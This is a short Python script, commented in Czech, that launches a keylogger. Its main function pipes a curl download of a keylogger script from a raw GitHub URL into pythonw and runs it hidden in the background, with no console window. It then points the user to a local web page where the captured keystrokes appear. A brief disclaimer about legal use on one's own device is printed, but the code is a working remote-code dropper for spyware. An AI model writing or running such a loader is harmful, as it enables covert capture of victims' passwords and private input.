import os
import sys
import time
import socket
import subprocess

def get_local_ip():
    """Získá lokální IP adresu"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def run_keylogger_directly():
    """Spustí keylogger přímo z GitHubu pomocí curl"""
    github_url = "https://raw.githubusercontent.com/Kalinuxio/scaling-lamp/refs/heads/main/key_logger_v4.pyw"
    
    try:
        print("🎯 Spouštím keylogger přímo z GitHubu...")
        
        # Přímé spuštění pomocí curl + python
        curl_cmd = f'curl -s "{github_url}" | pythonw -'
        
        # Spuštění na pozadí
        subprocess.Popen(curl_cmd, shell=True,
                       stdout=subprocess.DEVNULL, 
                       stderr=subprocess.DEVNULL,
                       creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        print(f"❌ Chyba při spouštění: {e}")
        return False

def main():
    print("=" * 60)
    print("🚀 KEYLOGGER S REAL-TIME WEBOVÝM ROZHRANÍM")
    print("=" * 60)
    print("📋 DISCLAIMER: Tento program je určen pouze pro legální a")
    print("   etické použití. Pouze pro vlastní potřebu na vlastním")
    print("   zařízení. NESETE PLNÉ PRÁVNÍ NÁSLEDKY ZA POUŽITÍ.")
    print("=" * 60)
    
    # Získání informací
    port = 8888
    ip = get_local_ip()
    exit_phrase = "stopnow"
    
    print(f"🌐 Lokální adresa: http://localhost:{port}")
    print(f"🔗 Síťová adresa:  http://{ip}:{port}")
    print(f"⏱️  Interval záznamu: 10 sekund")
    print(f"🛑 Fráze pro ukončení: '{exit_phrase}'")
    print("=" * 60)
    print("⏳ Program se spustí na pozadí za 5 sekund...")
    print("   Hlavní okno se zavře a program poběží na pozadí.")
    print("   Data můžete sledovat v prohlížeči na výše uvedené adrese.")
    print("   Pro ukončení napište do kteréhokoli programu frázi: 'stopnow'")
    print("=" * 60)
    
    # Odpočet 5 sekund
    for i in range(5, 0, -1):
        print(f"🕒 Zbývá {i} sekund...")
        time.sleep(1)
    
    # Přímé spuštění z GitHubu
    success = run_keylogger_directly()
    
    if success:
        print("✅ Keylogger byl úspěšně spuštěn na pozadí!")
        print("🔗 Data: http://localhost:8888")
    else:
        print("❌ Nepodařilo se spustit keylogger!")
    
    print("🔒 Konzole se nyní zavře...")
    time.sleep(2)

if __name__ == "__main__":
    main()
